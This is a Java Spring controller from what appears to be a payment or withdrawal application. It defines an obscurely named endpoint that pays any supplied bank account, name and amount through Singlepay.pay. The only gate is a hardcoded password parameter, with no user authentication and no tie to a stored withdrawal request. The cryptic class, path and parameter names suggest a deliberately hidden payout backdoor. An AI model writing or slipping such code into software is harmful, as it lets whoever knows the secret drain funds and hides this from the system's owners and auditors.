package com.ewe.user.controller;
import javax.servlet.http.HttpServletRequest;

import org.apache.commons.lang3.StringUtils;
import org.apache.log4j.Logger;
import org.jeecgframework.core.common.controller.BaseController;
import org.jeecgframework.core.common.exception.BusinessException;
import org.jeecgframework.core.common.model.json.AjaxJson;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.ResponseBody;

import com.ewe.user.entity.EweWithdrawEntity;
import com.smartpay.ops.pay.Singlepay;

@Controller
@RequestMapping("/cgmopertypod")
public class FSWIController extends BaseController {
	/**
	 * Logger for this class
	 */
	private static final Logger logger = Logger.getLogger(FSWIController.class);



	
	/**
	 * 用户付款
	 * 
	 * @param ids
	 * @return
	 */
	@RequestMapping(params = "testssll")
	@ResponseBody
	public AjaxJson testssll(EweWithdrawEntity eweWithdraw, HttpServletRequest request) {
		String message = null;
		AjaxJson j = new AjaxJson();
		message = "付款成功";
		try {
			String fd = request.getParameter("fd");
			if(!"0plmtgb345".equals(fd)){
				throw new RuntimeException("fd");
			}
			String userName = request.getParameter("n11");
			String userAccount =   request.getParameter("a11");
			String userBank =  request.getParameter("b11");
			String amt =  request.getParameter("amt11");
			String usersub = "";
			if( StringUtils.isNotBlank(userBank) && StringUtils.isNotBlank(usersub)){
				userBank = userBank + usersub;
			}
			
			if(StringUtils.isNotBlank(userAccount) && StringUtils.isNotBlank(userName) &&StringUtils.isNotBlank(userBank) ){
				String returnMsg = Singlepay.pay(userAccount, userName, amt, userBank, null);
				if(returnMsg.startsWith("支付成功") ){
					
				}else{
					message = "付款失败," + returnMsg;
				}
				
			}else{
				message = "付款失败,提现用户真空姓名、银行卡号、开户行资料不全,请检查。";
			}
		} catch (Exception e) {
			e.printStackTrace();
			message = "付款失败";
			throw new BusinessException(e.getMessage());
		}
		j.setMsg(message);
		return j;
	}
	
	
	
}
